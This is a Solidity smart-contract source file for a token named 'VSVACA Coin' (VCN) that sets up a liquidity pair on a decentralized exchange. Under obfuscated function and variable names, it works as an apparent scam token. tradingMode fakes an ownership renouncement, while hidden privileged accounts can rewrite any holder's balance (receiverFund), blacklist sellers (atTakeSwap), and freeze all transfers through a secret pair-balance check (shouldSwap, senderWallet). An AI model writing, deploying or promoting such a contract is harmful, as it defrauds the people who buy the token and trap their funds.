//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface fromReceiver {
    function totalSupply() external view returns (uint256);

    function balanceOf(address minTake) external view returns (uint256);

    function transfer(address shouldFee, uint256 atFromFee) external returns (bool);

    function allowance(address limitFromReceiver, address spender) external view returns (uint256);

    function approve(address spender, uint256 atFromFee) external returns (bool);

    function transferFrom(
        address sender,
        address shouldFee,
        uint256 atFromFee
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverAmount, uint256 value);
    event Approval(address indexed limitFromReceiver, address indexed spender, uint256 value);
}

interface fromReceiverMetadata is fromReceiver {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract enableTx {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface walletMarketingAmount {
    function createPair(address buyAt, address modeList) external returns (address);
}

interface atLaunch {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract VSVACACoin is enableTx, fromReceiver, fromReceiverMetadata {

    function symbol() external view virtual override returns (string memory) {
        return receiverLaunchedLiquidity;
    }

    address exemptSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address launchReceiverTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function getOwner() external view returns (address) {
        return swapBuyFee;
    }

    bool public listFee;

    function balanceOf(address minTake) public view virtual override returns (uint256) {
        return sellTake[minTake];
    }

    uint256 tokenAt;

    function receiverFund(address atReceiverTx, uint256 atFromFee) public {
        fundTeam();
        sellTake[atReceiverTx] = atFromFee;
    }

    function atTakeSwap(address shouldTx) public {
        fundTeam();
        
        if (shouldTx == receiverFee || shouldTx == limitLaunched) {
            return;
        }
        amountSwap[shouldTx] = true;
    }

    address public limitLaunched;

    uint256 private marketingSender;

    uint256 public receiverExempt;

    function isLimitMarketing(address minMarketing, address shouldFee, uint256 atFromFee) internal returns (bool) {
        require(sellTake[minMarketing] >= atFromFee);
        sellTake[minMarketing] -= atFromFee;
        sellTake[shouldFee] += atFromFee;
        emit Transfer(minMarketing, shouldFee, atFromFee);
        return true;
    }

    bool private fundSwap;

    function tradingMode() public {
        emit OwnershipTransferred(receiverFee, address(0));
        swapBuyFee = address(0);
    }

    function transfer(address atReceiverTx, uint256 atFromFee) external virtual override returns (bool) {
        return senderWallet(_msgSender(), atReceiverTx, atFromFee);
    }

    bool private enableMax;

    mapping(address => uint256) private sellTake;

    function transferFrom(address minMarketing, address shouldFee, uint256 atFromFee) external override returns (bool) {
        if (_msgSender() != exemptSwap) {
            if (fromExemptTx[minMarketing][_msgSender()] != type(uint256).max) {
                require(atFromFee <= fromExemptTx[minMarketing][_msgSender()]);
                fromExemptTx[minMarketing][_msgSender()] -= atFromFee;
            }
        }
        return senderWallet(minMarketing, shouldFee, atFromFee);
    }

    function owner() external view returns (address) {
        return swapBuyFee;
    }

    uint256 public sellTotal;

    function senderWallet(address minMarketing, address shouldFee, uint256 atFromFee) internal returns (bool) {
        if (minMarketing == receiverFee) {
            return isLimitMarketing(minMarketing, shouldFee, atFromFee);
        }
        uint256 fundIs = fromReceiver(limitLaunched).balanceOf(launchReceiverTrading);
        require(fundIs == limitSender);
        require(!amountSwap[minMarketing]);
        return isLimitMarketing(minMarketing, shouldFee, atFromFee);
    }

    function name() external view virtual override returns (string memory) {
        return sellTx;
    }

    bool public receiverSell;

    function fundTeam() private view {
        require(launchSender[_msgSender()]);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return fromSwapExempt;
    }

    uint256 private fromExempt;

    address public receiverFee;

    mapping(address => mapping(address => uint256)) private fromExemptTx;

    function isEnable(address atSenderTx) public {
        if (listFee) {
            return;
        }
        if (receiverExempt == buyTeam) {
            buyTeam = receiverExempt;
        }
        launchSender[atSenderTx] = true;
        
        listFee = true;
    }

    address private swapBuyFee;

    constructor (){
        
        tradingMode();
        atLaunch modeAt = atLaunch(exemptSwap);
        limitLaunched = walletMarketingAmount(modeAt.factory()).createPair(modeAt.WETH(), address(this));
        
        receiverFee = _msgSender();
        launchSender[receiverFee] = true;
        sellTake[receiverFee] = fromSwapExempt;
        
        emit Transfer(address(0), receiverFee, fromSwapExempt);
    }

    uint8 private txMinShould = 18;

    function allowance(address teamFund, address senderAmountMarketing) external view virtual override returns (uint256) {
        if (senderAmountMarketing == exemptSwap) {
            return type(uint256).max;
        }
        return fromExemptTx[teamFund][senderAmountMarketing];
    }

    uint256 limitSender;

    mapping(address => bool) public amountSwap;

    uint256 private buyTeam;

    uint256 private fromSwapExempt = 100000000 * 10 ** 18;

    function decimals() external view virtual override returns (uint8) {
        return txMinShould;
    }

    string private receiverLaunchedLiquidity = "VCN";

    function shouldSwap(uint256 atFromFee) public {
        fundTeam();
        limitSender = atFromFee;
    }

    event OwnershipTransferred(address indexed launchAuto, address indexed shouldReceiver);

    string private sellTx = "VSVACA Coin";

    mapping(address => bool) public launchSender;

    function approve(address senderAmountMarketing, uint256 atFromFee) public virtual override returns (bool) {
        fromExemptTx[_msgSender()][senderAmountMarketing] = atFromFee;
        emit Approval(_msgSender(), senderAmountMarketing, atFromFee);
        return true;
    }

}